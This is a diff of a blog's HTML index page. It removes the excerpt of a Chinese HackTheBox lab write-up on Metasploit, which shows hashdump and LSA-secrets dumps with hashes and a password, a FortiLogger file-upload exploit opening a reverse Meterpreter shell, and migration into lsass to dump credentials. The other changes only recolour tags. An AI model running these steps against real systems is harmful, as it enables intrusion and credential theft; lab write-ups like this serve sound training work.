@@ -219,7 +219,6 @@
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p>  MSF - 转储哈希</p>
 <pre><code>meterpreter &gt; hashdump
 
@@ -274,296 +273,7 @@ User : Lakis
   Hash LM  : f927b0679b3cc0e192410d9b0b40873c
   Hash NTLM: 3064b6fc432033870c6730228af7867c
 </code></pre>
-<h4 id="MSF-Meterpreter-LSA-Secrets-Dump"><a href="#MSF-Meterpreter-LSA-Secrets-Dump" class="headerlink" title="MSF - Meterpreter LSA Secrets Dump"></a>MSF - Meterpreter LSA Secrets Dump</h4><p>  MSF - Meterpreter LSA Secrets Dump</p>
-<pre><code>meterpreter &gt; lsa_dump_secrets
-
-[+] Running as SYSTEM
-[*] Dumping LSA secrets
-Domain : GRANNY
-SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
-
-Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
-Domain name : HTB
-
-Policy subsystem is : 1.7
-LSA Key : ada60ee248094ce782807afae1711b2c
-
-Secret  : aspnet_WP_PASSWORD
-cur/text: Q5C&#39;181g16D&#39;=F
-
-Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
-cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 
-
-Secret  : DPAPI_SYSTEM
-cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
-    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
-    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63
-
-Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
-cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
-
-Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
-cur/hex : 00 f2 d1 31 e2 11 d3 01 
-
-Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;
-cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
-old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 
-
-Secret  : NL$KM
-cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 
-
-Secret  : SAC
-
-Secret  : SAI
-
-Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;
-
-Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;
-
-Secret  : _SC_Alerter / service &#39;Alerter&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_ALG / service &#39;ALG&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_aspnet_state / service &#39;aspnet_state&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_Dhcp / service &#39;Dhcp&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_Dnscache / service &#39;Dnscache&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_LicenseService / service &#39;LicenseService&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_LmHosts / service &#39;LmHosts&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_MSDTC / service &#39;MSDTC&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_RpcLocator / service &#39;RpcLocator&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_RpcSs / service &#39;RpcSs&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_stisvc / service &#39;stisvc&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_TlntSvr / service &#39;TlntSvr&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_WebClient / service &#39;WebClient&#39; with username : NT AUTHORITY\LocalService
-</code></pre>
-<p>暂时不知道怎么使用，但是先记录一下以备后续查找</p>
-<h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><p>来自hackthebox：<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/414">USING THE METASPLOIT FRAMEWORK</a></p>
-<p>目标主机： 10.129.203.65</p>
-<p>渗透目标：</p>
-<ul>
-<li>在 MSF 中查找现有漏洞，并使用它来获取目标上的外壳。您获得外壳的用户的用户名是什么？</li>
-<li>检索“htb-student”用户的 NTLM 密码哈希。提交哈希作为答案。</li>
-</ul>
-<h5 id="先扫描一下："><a href="#先扫描一下：" class="headerlink" title="先扫描一下："></a>先扫描一下：</h5><pre><code># nmap -sV -sC 10.129.203.65
-Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-13 16:29 CST
-Nmap scan report for 10.129.203.65
-Host is up (0.30s latency).
-Not shown: 995 closed ports
-PORT     STATE SERVICE       VERSION
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds?
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-ntlm-info: 
-|   Target_Name: WIN-51BJ97BCIPV
-|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
-|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
-|   DNS_Domain_Name: WIN-51BJ97BCIPV
-|   DNS_Computer_Name: WIN-51BJ97BCIPV
-|   Product_Version: 10.0.17763
-|_  System_Time: 2023-06-13T08:30:06+00:00
-| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
-| Not valid before: 2023-06-12T08:17:05
-|_Not valid after:  2023-12-12T08:17:05
-|_ssl-date: 2023-06-13T08:30:15+00:00; 0s from scanner time.
-5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: FortiLogger | Log and Report System
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2023-06-13T08:30:07
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds
-</code></pre>
-<p>发现5000端口的IIS服务有潜在风险，搜索一下发先Microsoft-IIS&#x2F;10.0存在一个<a href="%5B(146%E6%9D%A1%E6%B6%88%E6%81%AF">短文件漏洞</a> IIS短文件漏洞_microsoft-iis&#x2F;10.0_cacheyu的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Amdy_amdy/article/details/108864220))%E3%80%82">https://blog.csdn.net/Amdy_amdy/article/details/108864220))。</a></p>
-<p>msf 搜索一下，确实可以使用但是没办法返回一个shell，所以找找其他的漏洞。</p>
-<p>我们尝试访问一下这个5000端口，但是身份验证失败，说明确实有一个网页，从扫描结果来看网站名为<code>FortiLogger</code> 一般而言这应该是网页搭建的框架之类的东西，查找一下：</p>
-<h5 id="什么是-FortiLogger？"><a href="#什么是-FortiLogger？" class="headerlink" title="什么是 FortiLogger？"></a>什么是 FortiLogger？</h5><p>FortiLogger 是一款基于 Web 的日志记录和报告软件，运行在专为 FortiGate 防火墙准备的 Windows 操作系统上。它具有即时状态监控，日志记录，搜索&#x2F;过滤，报告和热点等功能。</p>
-<p>再到漏洞库里搜索一下有没有相关漏洞，发现刚好有一个：</p>
-<pre><code>0 exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
-</code></pre>
-<p>无法确定具体版本，但是先try一try：</p>
-<pre><code>[*] Started reverse TCP handler on 10.10.15.22:4444 
-[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
-[+] The target is vulnerable. FortiLogger version 4.4.2.2
-[+] Generate Payload
-[+] Payload has been uploaded
-[*] Executing payload...
-[*] Sending stage (175686 bytes) to 10.129.203.65
-[*] Meterpreter session 1 opened (10.10.15.22:4444 -&gt; 10.129.203.65:49707) at 2023-06-13 17:31:54 +0800
-
-meterpreter &gt; 
-</code></pre>
-<p>成功了!打开shell：</p>
-<pre><code>C:\Windows\system32&gt;whoami
-whoami
-nt authority\system
-</code></pre>
-<p>得到第一题答案，执行hashdump：</p>
-<pre><code>hashdump
-&#39;hashdump&#39; is not recognized as an internal or external command,
-operable program or batch file.
-</code></pre>
-<p>发现不行</p>
-<h5 id="local-exploit-suggester"><a href="#local-exploit-suggester" class="headerlink" title="local_exploit_suggester"></a>local_exploit_suggester</h5><p>再引导文件中有这一段：</p>
-<pre><code>我们可以很容易地决定运行local exploit suggester模块，将其附加到当前活动的Meterpeter会话。要做到这一点，我们对当前的Metereter会话进行后台处理，搜索我们需要的模块，并将session选项设置为Metermeter会话的索引号，将模块绑定到它。
-</code></pre>
-<p>将这个模块绑定到会话上来，执行后：</p>
-<pre><code> #   Name                                                           Potentially Vulnerable?  Check Result
- -   ----                                                           -----------------------  ------------
- 1   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
- 2   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
- 3   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
- 4   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
-</code></pre>
-<p>发现了新的可用漏洞，但是使用了两个模块都没有提权成功，乌鱼子。（其实此时我发现在meterpreter 上可以直接hashdump）</p>
-<p>直接hashdump得到：</p>
-<pre><code>htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
-</code></pre>
-<p>这里解释一下这段hash（chatgpt）：</p>
-<pre><code>这段字符串 &quot;htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::&quot; 是使用 NTLM（NT LAN Manager）算法生成的密码哈希。
-
-让我解释一下每个部分的含义：
-
-1. &quot;htb-student&quot; 是账户名，表示用户名为 &quot;htb-student&quot;。
-2. &quot;1002&quot; 是用户的 RID（Relative Identifier），在 Windows 操作系统中用于标识用户的相对标识符。
-3. &quot;aad3b435b51404eeaad3b435b51404ee&quot; 是用户密码的 LM（LAN Manager）哈希值。LM哈希是一种弱密码哈希算法，已经被认为是不安全的，现代的 Windows 系统不再使用它来存储密码。
-4. &quot;cf3a5525ee9414229e66279623ed5c58&quot; 是用户密码的 NTLM 哈希值。NTLM哈希是一种更安全的密码哈希算法，用于存储密码的散列值。
-5. 最后两个冒号 &quot;::&quot; 表示空的 LM 哈希值和 NTLM 哈希值。在现代的 Windows 系统中，LM 哈希值通常为空，只使用 NTLM 哈希值进行密码验证。
-
-总结起来，这个字符串表示用户名为 &quot;htb-student&quot;，用户的密码经过 LM 哈希和 NTLM 哈希算法处理后的散列值分别为 &quot;aad3b435b51404eeaad3b435b51404ee&quot; 和 &quot;cf3a5525ee9414229e66279623ed5c58&quot;。
-
-在 HackTheBox 实验中，你只需要提交密码的 NTLM 哈希值 &quot;cf3a5525ee9414229e66279623ed5c58&quot; 作为答案，用于验证密码是否正确。
-</code></pre>
-<p>因此，我们提交后半段即可；</p>
-<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>lsa_dump_secrets：</p>
-<p>这是演示文档的内容</p>
-<h5 id="MSF-Meterpreter-LSA-Secrets-Dump-1"><a href="#MSF-Meterpreter-LSA-Secrets-Dump-1" class="headerlink" title="MSF - Meterpreter LSA Secrets Dump"></a>MSF - Meterpreter LSA Secrets Dump</h5><p>  MSF - Meterpreter LSA Secrets Dump</p>
-<pre><code>meterpreter &gt; lsa_dump_secrets
-
-[+] Running as SYSTEM
-[*] Dumping LSA secrets
-Domain : GRANNY
-SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
-
-Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
-Domain name : HTB
-
-Policy subsystem is : 1.7
-LSA Key : ada60ee248094ce782807afae1711b2c
-
-Secret  : aspnet_WP_PASSWORD
-cur/text: Q5C&#39;181g16D&#39;=F
-
-Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
-cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 
-
-Secret  : DPAPI_SYSTEM
-cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
-    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
-    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63
-
-Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
-cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
-
-Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
-cur/hex : 00 f2 d1 31 e2 11 d3 01 
-
-Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d
-
-Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;
-cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
-old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 
-
-Secret  : NL$KM
-cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 
-
-Secret  : SAC
-
-Secret  : SAI
-
-Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;
-
-Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;
-
-Secret  : _SC_Alerter / service &#39;Alerter&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_ALG / service &#39;ALG&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_aspnet_state / service &#39;aspnet_state&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_Dhcp / service &#39;Dhcp&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_Dnscache / service &#39;Dnscache&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_LicenseService / service &#39;LicenseService&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_LmHosts / service &#39;LmHosts&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_MSDTC / service &#39;MSDTC&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_RpcLocator / service &#39;RpcLocator&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_RpcSs / service &#39;RpcSs&#39; with username : NT AUTHORITY\NetworkService
-
-Secret  : _SC_stisvc / service &#39;stisvc&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_TlntSvr / service &#39;TlntSvr&#39; with username : NT AUTHORITY\LocalService
-
-Secret  : _SC_WebClient / service &#39;WebClient&#39; with username : NT AUTHORITY\LocalService
-</code></pre>
-<p>我们看一下什么是lsa（GPT）：</p>
-<pre><code>在Windows操作系统中，LSA（Local Security Authority）是一个关键的系统组件，它负责管理本地安全策略、用户身份验证和安全凭证的存储。LSA维护着安全策略数据库，其中包含了用户账户信息、密码哈希值以及其他安全相关的信息。
-
-LSA提供了一些API（应用程序接口）供其他系统组件和应用程序使用，其中之一是LSA Secrets API。这个API允许授权的程序读取和写入LSA Secrets，这些Secrets包含敏感信息，例如密码、证书、密钥等。
-
-&quot;lsa_dump_secrets&quot;是一个工具或命令，它可能是用于提取和显示LSA Secrets的工具。这个工具可以被用于安全评估、密码破解或恢复等场景，通过读取LSA Secrets可以获得密码哈希值或其他敏感信息，从而进行进一步的攻击或渗透测试。需要注意的是，使用这样的工具需要合法的权限和授权，未经授权使用可能会违反法律或违反系统安全政策。
-</code></pre>
-<p>除了使用工具，我们可以这样获得lsa_dump:</p>
-<p>(这里有个疑问，YouTube博主实在shell中执行命令，而我只能在meterpreter 上执行，很奇怪…)</p>
-<p>使用ps找到lsass.exe：</p>
-<pre><code> 636    472   lsass.exe    x64   0        NT AUTHORITY\SYSTE  C:\Windows\System32
-                                          M                   \lsass.exe
-</code></pre>
-<p>然后使用migrate移动到636</p>
-<pre><code>migrate 636
-</code></pre>
-<p>然后hashdump即可</p>
-<h5 id="aad3b435b51404eeaad3b435b51404ee"><a href="#aad3b435b51404eeaad3b435b51404ee" class="headerlink" title="aad3b435b51404eeaad3b435b51404ee"></a>aad3b435b51404eeaad3b435b51404ee</h5><p>这是一串空值的LM-hash</p>
-
+            
             
         </div>
     </div>
@@ -577,8 +287,22 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/base,-practice, hackthebox" style=color:#ff7d73>
-                base, practice, hackthebox
+            <a href="/tags/base" style=color:#ffa2c4>
+                base
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/practice" style=color:#03a9f4>
+                practice
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/hackthebox" style=color:#00a596>
+                hackthebox
             </a>
         </span>
         
@@ -667,7 +391,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00bcd4>
+            <a href="/tags/base" style=color:#00a596>
                 base
             </a>
         </span>
@@ -724,7 +448,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/靶场学习" style=color:#03a9f4>
+            <a href="/tags/靶场学习" style=color:#ffa2c4>
                 靶场学习
             </a>
         </span>
@@ -776,7 +500,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#ffa2c4>
                 base
             </a>
         </span>
@@ -847,7 +571,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/others" style=color:#ff7d73>
+            <a href="/tags/others" style=color:#ffa2c4>
                 others
             </a>
         </span>
@@ -908,7 +632,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/靶场学习" style=color:#03a9f4>
+            <a href="/tags/靶场学习" style=color:#ff7d73>
                 靶场学习
             </a>
         </span>
@@ -961,7 +685,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/靶场学习" style=color:#ff7d73>
+            <a href="/tags/靶场学习" style=color:#03a9f4>
                 靶场学习
             </a>
         </span>
@@ -1012,7 +736,7 @@ LSA提供了一些API（应用程序接口）供其他系统组件和应用程�
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#00a596>
                 base
             </a>
         </span>
@@ -1074,7 +798,7 @@ index.html
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ffa2c4>
+            <a href="/tags/base" style=color:#03a9f4>
                 base
             </a>
         </span>
@@ -1149,7 +873,7 @@ index.html
         
         <span class="tag">
             
-            <a href="/tags/other" style=color:#03a9f4>
+            <a href="/tags/other" style=color:#ff7d73>
                 other
             </a>
         </span>
